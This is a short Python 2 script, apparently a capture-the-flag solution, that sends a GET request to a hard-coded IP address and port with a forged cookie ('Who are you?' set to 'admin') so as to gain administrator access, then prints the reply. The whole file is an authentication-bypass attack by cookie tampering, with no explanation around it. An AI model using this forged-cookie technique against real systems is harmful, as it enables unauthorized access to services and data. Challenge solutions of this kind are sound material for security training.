#!/usr/bin/env python

import requests

url = 'http://34.216.132.109:8084/'

cookies = {'Who are you?' : 'admin'}

r = requests.get(url, cookies = cookies)

print r.text
